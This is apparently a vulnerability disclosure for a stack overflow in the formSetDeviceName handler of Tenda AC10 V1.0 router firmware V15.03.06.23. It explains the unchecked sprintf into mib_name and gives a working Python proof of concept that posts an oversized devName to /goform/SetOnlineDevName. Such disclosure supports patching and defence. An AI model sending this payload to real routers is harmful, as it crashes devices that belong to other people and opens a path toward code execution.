stackflow\_formSetDeviceName
----------------------------

### Overview

*   Equipment website：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   Firmware download website：[AC10V1.0升级软件](https://www.tenda.com.cn/material/show/102734)

### Affected version

V1.0 V15.03.06.23

### Vulnerability details

Tenda AC10 V1.0 V15.03.06.23 The devName argument in the formSetDeviceName function causes a stack overflow and passes it to the function "set\_device\_name" without any length checking. Once the ROP chain is built, malicious code can be executed.

![](api/attachments/f3k863AMSrJ6/image/image.png)

After getting the mac and devName parameters, type set\_device\_name, check only if the parameter "dev\_name" exists, and use sprintf to pass it to the "mib\_name" array, which will overflow the stack if the length exceeds it

![](api/attachments/HFqG5wHg0dxB/image/image.png)

### poc

```text-plain
import requests
ip = '192.168.159.100'
url = f'http://{ip}/goform/SetOnlineDevName'
payload = {
   "mac": '9c:fc:e8:da:9c:5b',
   "devName": 'Raining'*0x500
}
res = requests.post(url=url, data=payload)
print(res.content)
```

![](api/attachments/5mgyxqNbbsnd/image/image.png)